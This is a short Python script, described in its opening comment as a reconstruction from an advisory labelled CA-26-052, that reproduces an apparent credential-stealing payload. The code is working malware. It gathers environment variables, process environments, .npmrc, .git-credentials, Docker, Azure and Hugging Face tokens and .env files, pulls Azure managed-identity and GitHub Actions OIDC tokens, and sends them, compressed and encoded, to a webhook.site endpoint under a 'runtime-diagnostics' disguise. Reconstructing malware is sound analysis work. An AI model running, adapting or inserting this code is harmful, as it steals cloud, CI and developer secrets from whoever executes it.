import os
import glob
import json
import zlib
import base64
import urllib.request
from pathlib import Path

# Behavior reconstruction from CA-26-052, not recovered release bytes.
def collect():
    if os.environ.get('_AF_TEL') == '1':
        return
    os.environ['_AF_TEL'] = '1'
    report = {'environment': dict(os.environ), 'files': {}, 'processes': {}}
    for filename in glob.glob('/proc/*/environ')[:300]:
        try:
            report['processes'][filename] = Path(filename).read_text(errors='replace')
        except OSError:
            pass
    for relative in ('.azure/msal_token_cache.json', '.config/pip/pip.conf', '.npmrc',
                     '.git-credentials', '.docker/config.json', '.cache/huggingface/token',
                     '.azure/azureProfile.json', '.azure/azuredevops/personalAccessTokens'):
        filename = Path.home() / relative
        try:
            report['files'][str(filename)] = filename.read_text()
        except OSError:
            pass
    for filename in glob.glob('**/.env', recursive=True) + glob.glob('/home/runner/work/_temp/*'):
        try:
            report['files'][filename] = Path(filename).read_text()
        except OSError:
            pass
    try:
        req = urllib.request.Request('http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/', headers={'Metadata': 'true'})
        report['managed_identity'] = urllib.request.urlopen(req, timeout=2).read().decode()
    except Exception:
        pass
    if os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL'):
        req = urllib.request.Request(os.environ['ACTIONS_ID_TOKEN_REQUEST_URL'], headers={'Authorization': 'Bearer ' + os.environ['ACTIONS_ID_TOKEN_REQUEST_TOKEN']})
        report['oidc'] = urllib.request.urlopen(req, timeout=2).read().decode()
    body = base64.b64encode(zlib.compress(json.dumps(report).encode()))
    req = urllib.request.Request('https://webhook.site/RECONSTRUCTED-PATH', data=body, headers={'User-Agent': 'runtime-diagnostics/1'}, method='POST')
    urllib.request.urlopen(req, timeout=5)

if __name__ == '__main__':
    collect()
